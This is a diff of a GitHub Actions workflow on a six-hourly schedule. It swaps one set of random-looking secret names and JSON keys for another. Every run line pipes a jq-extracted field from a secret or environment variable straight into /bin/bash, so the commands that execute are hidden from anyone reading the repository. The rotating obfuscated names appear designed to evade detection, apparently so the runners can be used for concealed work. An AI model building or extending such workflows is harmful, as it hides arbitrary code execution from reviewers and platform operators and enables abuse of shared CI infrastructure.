@@ -1,10 +1,9 @@
 name: xingtianyuan4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
-jobs:  # 10275
+    - cron: '19 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +11,11 @@ jobs:  # 10275
       - uses: actions/checkout@v4
       - name: xingtianyuan4567
         env:
-          krti92767: ${{ secrets.krti92767 }}
+          moqby98: ${{ secrets.moqby98 }}
         run: |
-          echo $krti92767 | jq -r .s9839 | /bin/bash
-          echo $eg6746 | jq -r .glstw65 | /bin/bash
-          echo $tuz17 | jq -r .k75 | /bin/bash
-          echo $z6 | jq -r .f0 | /bin/bash
-          echo $vddza843 | jq -r .vr372 | /bin/bash
-          echo $xkhb1717 | jq -r .noyu60 | /bin/bash
-          echo $dmmqq575 | jq -r .kwmgc5758 | /bin/bash
+          echo $moqby98 | jq -r .biz9 | /bin/bash
+          echo $qnldr08 | jq -r .gumr29 | /bin/bash
+          echo $n21457 | jq -r .xjgoe31 | /bin/bash
+          echo $l49 | jq -r .rsvwp2 | /bin/bash
+          echo $d36 | jq -r .ny2 | /bin/bash
 
